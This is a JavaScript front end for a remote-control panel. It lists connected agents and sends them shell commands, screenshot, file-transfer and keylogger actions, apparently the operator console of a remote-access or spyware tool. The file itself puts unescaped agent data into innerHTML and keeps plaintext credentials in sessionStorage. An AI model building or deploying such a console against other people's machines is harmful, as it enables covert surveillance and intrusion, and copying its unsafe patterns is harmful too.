/**
 * Remote System Control Panel - Frontend Application
 * 
 * Implements web UI for agent management with real-time updates
 * Requirements: 11.2, 11.3, 11.4, 11.5, 11.6, 11.7, 11.8
 */

class RemoteSystemApp {
    constructor() {
        this.apiBase = '/api';
        this.credentials = null;
        this.currentAgentId = null;
        this.agents = [];
        this.refreshInterval = null;
        this.historyFilter = '';
        
        this.init();
    }

    init() {
        // Check if already logged in
        const savedCreds = sessionStorage.getItem('credentials');
        if (savedCreds) {
            this.credentials = JSON.parse(savedCreds);
            this.showDashboard();
        } else {
            this.showLogin();
        }

        // Setup event listeners
        this.setupEventListeners();
    }

    setupEventListeners() {
        // Login form
        document.getElementById('login-form').addEventListener('submit', (e) => {
            e.preventDefault();
            this.handleLogin();
        });

        // Logout button
        document.getElementById('logout-btn').addEventListener('click', () => {
            this.handleLogout();
        });

        // Refresh button
        document.getElementById('refresh-btn').addEventListener('click', () => {
            this.loadAgents();
        });

        // Close detail view
        document.getElementById('close-detail-btn').addEventListener('click', () => {
            this.showAgentList();
        });

        // Command form
        document.getElementById('command-form').addEventListener('submit', (e) => {
            e.preventDefault();
            this.executeCommand();
        });

        // Plugin select change
        document.getElementById('plugin-select').addEventListener('change', (e) => {
            this.updateCommandInput(e.target.value);
        });

        // Refresh history
        document.getElementById('refresh-history-btn').addEventListener('click', () => {
            this.loadHistory();
        });

        // History filter
        document.getElementById('history-filter').addEventListener('input', (e) => {
            this.historyFilter = e.target.value.toLowerCase();
            this.filterHistory();
        });

        // Screenshot modal close
        document.querySelector('.close-modal').addEventListener('click', () => {
            document.getElementById('screenshot-modal').classList.add('hidden');
        });

        // Close modal on outside click
        document.getElementById('screenshot-modal').addEventListener('click', (e) => {
            if (e.target.id === 'screenshot-modal') {
                document.getElementById('screenshot-modal').classList.add('hidden');
            }
        });
    }

    // Authentication
    async handleLogin() {
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        const errorEl = document.getElementById('login-error');

        errorEl.textContent = '';

        try {
            // Test authentication with health check
            const response = await this.apiRequest('/health', 'GET', null, { username, password });
            
            if (response.success) {
                this.credentials = { username, password };
                sessionStorage.setItem('credentials', JSON.stringify(this.credentials));
                this.showDashboard();
            }
        } catch (error) {
            errorEl.textContent = error.message || 'Login failed. Please check your credentials.';
        }
    }

    handleLogout() {
        this.credentials = null;
        sessionStorage.removeItem('credentials');
        this.stopAutoRefresh();
        this.showLogin();
    }

    // Page Navigation
    showLogin() {
        document.getElementById('login-page').classList.add('active');
        document.getElementById('dashboard-page').classList.remove('active');
        document.getElementById('username').value = '';
        document.getElementById('password').value = '';
    }

    showDashboard() {
        document.getElementById('login-page').classList.remove('active');
        document.getElementById('dashboard-page').classList.add('active');
        this.showAgentList();
        this.loadAgents();
        this.startAutoRefresh();
    }

    showAgentList() {
        document.getElementById('agent-list-section').classList.remove('hidden');
        document.getElementById('agent-detail-section').classList.add('hidden');
        this.currentAgentId = null;
    }

    showAgentDetail(agentId) {
        this.currentAgentId = agentId;
        document.getElementById('agent-list-section').classList.add('hidden');
        document.getElementById('agent-detail-section').classList.remove('hidden');
        this.loadAgentDetail(agentId);
        this.loadHistory();
    }

    // API Requests
    async apiRequest(endpoint, method = 'GET', body = null, credentials = null) {
        const creds = credentials || this.credentials;
        const headers = {
            'Content-Type': 'application/json'
        };

        if (creds) {
            const auth = btoa(`${creds.username}:${creds.password}`);
            headers['Authorization'] = `Basic ${auth}`;
        }

        const options = {
            method,
            headers
        };

        if (body) {
            options.body = JSON.stringify(body);
        }

        const response = await fetch(`${this.apiBase}${endpoint}`, options);
        
        if (response.status === 401) {
            this.handleLogout();
            throw new Error('Authentication required');
        }

        const data = await response.json();
        
        if (!data.success) {
            throw new Error(data.error || 'Request failed');
        }

        return data;
    }

    // Agent Management
    async loadAgents() {
        try {
            const data = await this.apiRequest('/agents');
            this.agents = data.agents || [];
            this.renderAgentList();
        } catch (error) {
            console.error('Failed to load agents:', error);
            this.showError('Failed to load agents: ' + error.message);
        }
    }

    renderAgentList() {
        const container = document.getElementById('agent-list');
        const noAgents = document.getElementById('no-agents');
        const countEl = document.getElementById('agent-count');

        countEl.textContent = `${this.agents.length} Agent${this.agents.length !== 1 ? 's' : ''}`;

        if (this.agents.length === 0) {
            container.innerHTML = '';
            noAgents.style.display = 'block';
            return;
        }

        noAgents.style.display = 'none';
        container.innerHTML = this.agents.map(agent => `
            <div class="agent-card ${agent.status}" data-agent-id="${agent.agent_id}">
                <h3>${agent.hostname || 'Unknown'}</h3>
                <span class="status ${agent.status}">${agent.status}</span>
                <div class="info">
                    <div><strong>User:</strong> ${agent.username || 'N/A'}</div>
                    <div><strong>OS:</strong> ${agent.os_type || 'N/A'} ${agent.os_version || ''}</div>
                    <div><strong>IP:</strong> ${agent.ip_address || 'N/A'}</div>
                    <div><strong>Last Seen:</strong> ${this.formatTimestamp(agent.last_seen)}</div>
                </div>
            </div>
        `).join('');

        // Add click handlers
        container.querySelectorAll('.agent-card').forEach(card => {
            card.addEventListener('click', () => {
                const agentId = card.dataset.agentId;
                this.showAgentDetail(agentId);
            });
        });
    }

    async loadAgentDetail(agentId) {
        const agent = this.agents.find(a => a.agent_id === agentId);
        if (!agent) return;

        const infoContainer = document.getElementById('agent-info');
        infoContainer.innerHTML = `
            <div class="info-item">
                <strong>Agent ID</strong>
                <span>${agent.agent_id}</span>
            </div>
            <div class="info-item">
                <strong>Hostname</strong>
                <span>${agent.hostname || 'N/A'}</span>
            </div>
            <div class="info-item">
                <strong>Username</strong>
                <span>${agent.username || 'N/A'}</span>
            </div>
            <div class="info-item">
                <strong>Operating System</strong>
                <span>${agent.os_type || 'N/A'} ${agent.os_version || ''}</span>
            </div>
            <div class="info-item">
                <strong>IP Address</strong>
                <span>${agent.ip_address || 'N/A'}</span>
            </div>
            <div class="info-item">
                <strong>MAC Address</strong>
                <span>${agent.mac_address || 'N/A'}</span>
            </div>
            <div class="info-item">
                <strong>Status</strong>
                <span class="status ${agent.status}">${agent.status}</span>
            </div>
            <div class="info-item">
                <strong>Connected At</strong>
                <span>${this.formatTimestamp(agent.connected_at)}</span>
            </div>
            <div class="info-item">
                <strong>Last Seen</strong>
                <span>${this.formatTimestamp(agent.last_seen)}</span>
            </div>
        `;
    }

    // Command Execution
    updateCommandInput(plugin) {
        const inputGroup = document.getElementById('command-input-group');
        const input = document.getElementById('command-input');

        if (plugin === 'screenshot') {
            input.placeholder = 'Optional: {"quality": 85, "format": "PNG"}';
        } else if (plugin === 'executor') {
            input.placeholder = 'Enter shell command (e.g., "dir" or "ls -la")';
        } else if (plugin === 'file_transfer') {
            input.placeholder = '{"action": "download", "remote_path": "/path/to/file", "local_path": "/save/path"}';
        } else if (plugin === 'keylogger') {
            input.placeholder = '{"action": "start"} or {"action": "stop"} or {"action": "get_logs"}';
        } else if (plugin === 'systeminfo') {
            input.placeholder = 'Optional: {"detailed": true}';
        } else {
            input.placeholder = 'Enter command or JSON arguments';
        }
    }

    async executeCommand() {
        const plugin = document.getElementById('plugin-select').value;
        const commandInput = document.getElementById('command-input').value.trim();
        const resultBox = document.getElementById('command-result');

        if (!plugin) {
            this.showCommandResult('Please select a plugin', false);
            return;
        }

        if (!this.currentAgentId) {
            this.showCommandResult('No agent selected', false);
            return;
        }

        // Build command object
        let command;
        if (plugin === 'executor') {
            command = {
                plugin: 'executor',
                action: 'execute',
                args: { command: commandInput }
            };
        } else if (plugin === 'screenshot') {
            const args = commandInput ? JSON.parse(commandInput) : {};
            command = {
                plugin: 'screenshot',
                action: 'capture',
                args: args
            };
        } else {
            // Try to parse as JSON, otherwise use as string
            try {
                const args = commandInput ? JSON.parse(commandInput) : {};
                command = {
                    plugin: plugin,
                    args: args
                };
            } catch (e) {
                command = {
                    plugin: plugin,
                    args: { command: commandInput }
                };
            }
        }

        resultBox.classList.remove('hidden', 'success', 'error');
        resultBox.textContent = 'Executing command...';

        try {
            const data = await this.apiRequest(`/agents/${this.currentAgentId}/command`, 'POST', { command });
            this.showCommandResult(JSON.stringify(data, null, 2), true);
            
            // Refresh history after a short delay
            setTimeout(() => this.loadHistory(), 1000);
        } catch (error) {
            this.showCommandResult('Error: ' + error.message, false);
        }
    }

    showCommandResult(message, success) {
        const resultBox = document.getElementById('command-result');
        resultBox.classList.remove('hidden');
        resultBox.classList.add(success ? 'success' : 'error');
        resultBox.textContent = message;
    }

    // Command History
    async loadHistory() {
        if (!this.currentAgentId) return;

        try {
            const data = await this.apiRequest(`/agents/${this.currentAgentId}/history?limit=50`);
            this.renderHistory(data.history || []);
        } catch (error) {
            console.error('Failed to load history:', error);
        }
    }

    renderHistory(history) {
        const container = document.getElementById('command-history');

        if (history.length === 0) {
            container.innerHTML = '<div class="empty-state">No command history</div>';
            return;
        }

        container.innerHTML = history.map(item => `
            <div class="history-item ${item.status}" data-command="${item.command}">
                <div class="timestamp">${this.formatTimestamp(item.executed_at)}</div>
                <div class="command">${this.escapeHtml(JSON.stringify(item.command))}</div>
                <div class="result">${this.escapeHtml(item.result || 'No result')}</div>
            </div>
        `).join('');

        this.filterHistory();
    }

    filterHistory() {
        const items = document.querySelectorAll('.history-item');
        items.forEach(item => {
            const command = item.dataset.command.toLowerCase();
            if (this.historyFilter === '' || command.includes(this.historyFilter)) {
                item.style.display = 'block';
            } else {
                item.style.display = 'none';
            }
        });
    }

    // Auto Refresh
    startAutoRefresh() {
        this.stopAutoRefresh();
        this.refreshInterval = setInterval(() => {
            this.loadAgents();
            if (this.currentAgentId) {
                this.loadHistory();
            }
        }, 5000); // Refresh every 5 seconds
    }

    stopAutoRefresh() {
        if (this.refreshInterval) {
            clearInterval(this.refreshInterval);
            this.refreshInterval = null;
        }
    }

    // Utility Functions
    formatTimestamp(timestamp) {
        if (!timestamp) return 'N/A';
        const date = new Date(timestamp);
        return date.toLocaleString();
    }

    escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }

    showError(message) {
        console.error(message);
        // Could add a toast notification here
    }
}

// Initialize app when DOM is ready
document.addEventListener('DOMContentLoaded', () => {
    window.app = new RemoteSystemApp();
});
